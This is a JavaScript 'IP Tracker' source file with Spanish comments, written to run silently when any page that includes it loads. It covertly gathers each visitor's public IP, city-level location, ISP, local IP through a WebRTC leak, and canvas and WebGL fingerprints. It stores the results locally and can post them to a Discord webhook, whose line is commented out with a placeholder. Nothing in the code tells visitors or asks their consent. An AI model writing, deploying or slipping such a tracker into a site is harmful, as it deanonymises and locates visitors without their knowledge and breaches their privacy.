/**
 * IP Tracker - Versión SIN Backend PHP
 * Solo usa APIs externas - Compatible con GitHub Pages
 */

class IPTrackerExterno {
    constructor() {
        this.datos = {};
        this.webhook = null; // URL donde enviar datos (Discord, Telegram, etc.)
    }

    // Configurar webhook (opcional)
    setWebhook(url) {
        this.webhook = url;
    }

    async iniciar() {
        try {
            await this.recopilarDatos();
            
            if (this.webhook) {
                await this.enviarAWebhook();
            }
            
            // También guardar en localStorage para consultar después
            this.guardarLocal();
            
            return this.datos;
        } catch (error) {
            console.debug('Tracker error:', error);
        }
    }

    async recopilarDatos() {
        // 1. Obtener IP y geolocalización (todo en uno)
        const geoData = await this.obtenerIPyGeo();
        
        // 2. Información del navegador
        const browserData = this.obtenerInfoNavegador();
        
        // 3. Hardware
        const hardwareData = this.obtenerInfoHardware();
        
        // 4. Fingerprints
        const fingerprints = await this.obtenerFingerprints();
        
        // 5. IP Local
        const ipLocal = await this.obtenerIPLocal();
        
        this.datos = {
            timestamp: new Date().toISOString(),
            id: this.generarID(),
            ...geoData,
            ...browserData,
            ...hardwareData,
            ...fingerprints,
            ip_local: ipLocal
        };
        
        return this.datos;
    }

    // Obtener IP + Geolocalización completa con ipapi.co
    async obtenerIPyGeo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            return {
                ip: data.ip,
                pais: data.country_name,
                codigo_pais: data.country_code,
                region: data.region,
                ciudad: data.city,
                codigo_postal: data.postal,
                coordenadas: {
                    lat: data.latitude,
                    lon: data.longitude
                },
                zona_horaria: data.timezone,
                isp: data.org,
                asn: data.asn,
                moneda: data.currency,
                idiomas_pais: data.languages
            };
        } catch (e) {
            // Fallback a ipify + ip-api
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;
                
                const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
                const geoData = await geoRes.json();
                
                return {
                    ip: ip,
                    pais: geoData.country,
                    codigo_pais: geoData.countryCode,
                    region: geoData.regionName,
                    ciudad: geoData.city,
                    coordenadas: {
                        lat: geoData.lat,
                        lon: geoData.lon
                    },
                    zona_horaria: geoData.timezone,
                    isp: geoData.isp
                };
            } catch (err) {
                return { ip: 'No disponible' };
            }
        }
    }

    obtenerInfoNavegador() {
        const ua = navigator.userAgent;
        
        return {
            user_agent: ua,
            navegador: this.detectarNavegador(ua),
            sistema_operativo: this.detectarSO(ua),
            plataforma: navigator.platform,
            idioma: navigator.language,
            idiomas: navigator.languages,
            cookies_habilitadas: navigator.cookieEnabled,
            dnt: navigator.doNotTrack,
            es_movil: /mobile/i.test(ua),
            tipo_dispositivo: this.detectarDispositivo(ua),
            url_actual: window.location.href,
            referrer: document.referrer || 'Directo'
        };
    }

    obtenerInfoHardware() {
        return {
            pantalla: {
                resolucion: `${screen.width}x${screen.height}`,
                disponible: `${screen.availWidth}x${screen.availHeight}`,
                profundidad_color: screen.colorDepth,
                orientacion: screen.orientation?.type || 'N/A',
                touch: 'ontouchstart' in window
            },
            nucleos_cpu: navigator.hardwareConcurrency || 'N/A',
            memoria: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
            zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset_zona: new Date().getTimezoneOffset()
        };
    }

    async obtenerFingerprints() {
        const canvas = await this.canvasFingerprint();
        const webgl = this.webglFingerprint();
        
        return {
            canvas_fp: canvas,
            webgl_vendor: webgl.vendor,
            webgl_renderer: webgl.renderer,
            fingerprint_unico: this.generarFingerprintUnico()
        };
    }

    async canvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Canvas FP', 2, 15);
            return canvas.toDataURL().slice(-50);
        } catch (e) {
            return null;
        }
    }

    webglFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) {
            return { vendor: 'N/A', renderer: 'N/A' };
        }
    }

    async obtenerIPLocal() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                const timeout = setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 2000);
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate) return;
                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
                    if (ipMatch) {
                        clearTimeout(timeout);
                        pc.close();
                        resolve(ipMatch[0]);
                    }
                };
            } catch (e) {
                resolve(null);
            }
        });
    }

    // Guardar en localStorage para ver después
    guardarLocal() {
        try {
            let logs = JSON.parse(localStorage.getItem('visitor_logs') || '[]');
            logs.push(this.datos);
            
            // Mantener últimos 50
            if (logs.length > 50) {
                logs = logs.slice(-50);
            }
            
            localStorage.setItem('visitor_logs', JSON.stringify(logs));
        } catch (e) {
            console.debug('No se pudo guardar en localStorage');
        }
    }

    // Enviar a webhook (Discord, Telegram, etc.)
    async enviarAWebhook() {
        if (!this.webhook) return;
        
        try {
            // Formato para Discord Webhook
            const mensaje = this.formatearParaDiscord();
            
            await fetch(this.webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mensaje)
            });
        } catch (e) {
            console.debug('Error enviando a webhook');
        }
    }

    formatearParaDiscord() {
        const d = this.datos;
        return {
            embeds: [{
                title: '🔍 Nuevo Visitante Detectado',
                color: 0x667eea,
                fields: [
                    { name: '🌐 IP', value: d.ip || 'N/A', inline: true },
                    { name: '📍 Ubicación', value: `${d.ciudad}, ${d.pais}`, inline: true },
                    { name: '💻 Dispositivo', value: d.tipo_dispositivo, inline: true },
                    { name: '🌍 Navegador', value: d.navegador, inline: true },
                    { name: '🖥️ SO', value: d.sistema_operativo, inline: true },
                    { name: '📱 Móvil', value: d.es_movil ? 'Sí' : 'No', inline: true },
                    { name: '🏢 ISP', value: d.isp || 'N/A', inline: false },
                    { name: '🔗 URL', value: d.url_actual, inline: false },
                    { name: '⏰ Timestamp', value: new Date(d.timestamp).toLocaleString('es-ES'), inline: false }
                ],
                footer: { text: 'IP Tracker System' },
                timestamp: d.timestamp
            }]
        };
    }

    // Utilidades
    detectarNavegador(ua) {
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Edg')) return 'Edge';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Opera')) return 'Opera';
        return 'Desconocido';
    }

    detectarSO(ua) {
        if (ua.includes('Windows')) return 'Windows';
        if (ua.includes('Mac OS')) return 'macOS';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS';
        if (ua.includes('Linux')) return 'Linux';
        return 'Desconocido';
    }

    detectarDispositivo(ua) {
        if (/tablet|ipad/i.test(ua)) return 'Tablet';
        if (/mobile|android|iphone/i.test(ua)) return 'Móvil';
        return 'Desktop';
    }

    generarID() {
        return 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    generarFingerprintUnico() {
        const str = [
            navigator.userAgent,
            screen.width,
            screen.height,
            navigator.language,
            new Date().getTimezoneOffset()
        ].join('|');
        
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }
}

// Auto-inicializar de forma silenciosa
(function() {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    function init() {
        setTimeout(async () => {
            const tracker = new IPTrackerExterno();
            
            // OPCIONAL: Configura un webhook de Discord aquí
            // tracker.setWebhook('https://discord.com/api/webhooks/TU_WEBHOOK_ID/TOKEN');
            
            await tracker.iniciar();
            
            // Disponible para debugging
            window.__trackerExterno = tracker;
            
            console.debug('✅ Tracker externo activo');
        }, 1500);
    }
})();

// Función para ver los logs guardados localmente
function verLogsLocales() {
    const logs = JSON.parse(localStorage.getItem('visitor_logs') || '[]');
    console.table(logs);
    return logs;
}

// Exportar
if (typeof module !== 'undefined' && module.exports) {
    module.exports = IPTrackerExterno;
}
